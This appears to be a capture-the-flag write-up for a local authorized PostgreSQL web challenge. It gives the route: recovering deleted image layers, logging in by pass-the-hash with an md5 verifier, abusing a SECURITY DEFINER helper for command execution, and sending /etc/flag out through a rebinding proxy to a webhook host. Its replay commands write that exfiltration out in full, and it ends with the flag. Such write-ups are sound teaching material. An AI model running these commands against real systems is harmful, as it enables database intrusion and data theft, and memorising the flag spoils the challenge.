# PII In PG PI Player

## Metadata

- Event: local authorized CTF demo
- Category: Web
- Pattern: deleted image layer plus PostgreSQL md5 PTH, `SECURITY DEFINER`
  helper audit, loopback-only rebinding proxy, and deleted-layer decryptor
- Knowledge link:
  [ctf-knowledge-web.md#postgresql-security-definer-helper-with-loopback-only-rebinding-proxy](ctf-knowledge-web.md#postgresql-security-definer-helper-with-loopback-only-rebinding-proxy)
- Local solution:
  [solution note](../../../engagements/local-demo-pii-in-pg-pi-player/notes/solution.md)

## Prompt Summary

The target exposes only PostgreSQL, plus an image attachment. Hints point to
`/etc/`, `PTH & layers`, and `/mnt/run/rebind-proxy.sock`. The goal is to
recover the hidden material and decrypt the final flag.

## Signals

- Image history shows a clear `COPY` then `rm -rf` pattern around PGDATA.
- Deleted layer contains `rollup_stage_17.py`.
- `pg_shadow` md5 verifier enables `readonly` PTH login.
- `public.refresh_materialized_cache(text)` is `SECURITY DEFINER` and mentions
  `/mnt/run/rebind-proxy.sock`.
- The helper suppresses stdout/stderr, so direct command output will not be
  visible inside SQL results.
- A loopback-only rebinding proxy is more promising than large-object-only
  payload coercion once marker exfiltration succeeds.

## Route

1. Recover deleted-layer artifacts from the image tarball.
2. Reuse the recovered `readonly` md5 verifier to authenticate with
   `ctf_pg.py`.
3. Audit `refresh_materialized_cache(text)` and confirm the socket clue.
4. Prove the outbound route with a harmless POST marker sent through
   `/mnt/run/rebind-proxy.sock` to a fresh `1u.ms` rebinding domain that lands
   on `webhook.site`.
5. Exfiltrate raw `/etc/flag` instead of assuming a fixed `auditd:` prefix.
6. Extract the `encv1$...` token from the received body.
7. Decrypt it with the recovered `rollup_stage_17.py`.

## Replay Commands

```bash
python scripts/sec.py probe database query \
  --case-dir engagements/local-demo-pii-in-pg-pi-player \
  --host 10.35.143.77 \
  --port 55435 \
  --user readonly \
  --database user \
  --md5-verifier md5ca369bc3215272e713b43d3d47ef7b06 \
  --label rebind-marker-submit \
  --query "select ok from public.refresh_materialized_cache(\$job\$sh -c \"printf '%b' 'POST http://<fresh-prefix>-make-127.0.0.1-rebind-178.63.67.153-rr.1u.ms/<webhook-token>\\nhello' | socat - UNIX-CONNECT:/mnt/run/rebind-proxy.sock\"\$job\$);"

python scripts/sec.py probe database query \
  --case-dir engagements/local-demo-pii-in-pg-pi-player \
  --host 10.35.143.77 \
  --port 55435 \
  --user readonly \
  --database user \
  --md5-verifier md5ca369bc3215272e713b43d3d47ef7b06 \
  --label rebind-flag-raw-submit \
  --query "select ok from public.refresh_materialized_cache(\$job\$sh -c '(printf \"POST http://<fresh-prefix>-make-127.0.0.1-rebind-178.63.67.153-rr.1u.ms/<webhook-token>\\n\"; cat /etc/flag) | socat - \"UNIX-CONNECT:/mnt/run/rebind-proxy.sock\"'\$job\$);"
```

## Evidence

- Solution:
  [solution.md](../../../engagements/local-demo-pii-in-pg-pi-player/notes/solution.md)
- Marker proof:
  [rebind-marker-submit-pg-query.json](../../../engagements/local-demo-pii-in-pg-pi-player/artifacts/rebind-marker-submit-pg-query.json)
- Raw exfiltration:
  [rebind-flag-raw-submit-pg-query.json](../../../engagements/local-demo-pii-in-pg-pi-player/artifacts/rebind-flag-raw-submit-pg-query.json)
- Received flag body:
  [webhook-raw-flag-request.json](../../../engagements/local-demo-pii-in-pg-pi-player/artifacts/webhook-raw-flag-request.json),
  [webhook-raw-flag-content.txt](../../../engagements/local-demo-pii-in-pg-pi-player/artifacts/webhook-raw-flag-content.txt)
- Decryptor:
  [rollup_stage_17.py](../../../engagements/local-demo-pii-in-pg-pi-player/files/layer12-pgdata/var/lib/postgresql/data/user_scripts/rollup_stage_17.py)

## False Leads

- Spending too long trying to make the large-object state machine directly
  print the secret after the helper socket clue was already confirmed.
- Assuming `/etc/flag` matched the PDF sample's `auditd:<token>` layout.
- Treating the second-stage PGURL objects as the only intended endgame when a
  simpler rebinding callback already matched the helper comment and writeup.

## Final

`flag{Who_is_the_MVP_you_or_model_L5BFYO3GKNKGOTZZ}`
